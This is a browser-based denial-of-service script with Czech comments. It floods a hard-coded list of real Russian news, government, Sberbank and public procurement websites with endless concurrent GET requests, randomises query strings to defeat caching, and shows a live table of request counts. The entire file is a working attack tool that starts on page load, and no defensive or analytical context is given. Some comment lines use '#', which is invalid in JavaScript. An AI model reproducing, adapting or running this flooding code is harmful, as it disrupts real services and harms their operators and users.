<script>

#Definice cílů
  var targets = {
    'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://zakupki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  }

#reportovací tabulka
  var statsEl = document.getElementById('stats');
  function printStats() {
    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
  }
  setInterval(printStats, 1000);

#limit na současná aktivní spojení (1000x)
  var CONCURRENCY_LIMIT = 1000
  var queue = []

#Asynchronní funkce, paralerní běh.
  async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
      method: 'GET',
      mode: 'no-cors',
      signal: controller.signal
    }).then((response) => {
      clearTimeout(id);
      return response;
    }).catch((error) => {
      clearTimeout(id);
      throw error;
    });
  }

#Samotný DDoS.
  async function flood(target) {
    for (var i = 0;; ++i) {
      if (queue.length > CONCURRENCY_LIMIT) {
        await queue.shift()
      }
      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
      queue.push(
        fetchWithTimeout(target+rand, { timeout: 1000 })
          .catch((error) => {
            if (error.code === 20 /* ABORT */) {
              return;
            }
            targets[target].number_of_errored_responses++;
          })
          .then((response) => {
            if (response && !response.ok) {
              targets[target].number_of_errored_responses++;
            }
            targets[target].number_of_requests++;
          })

      )
    }
  }

  // Start
  Object.keys(targets).map(flood)
</script>
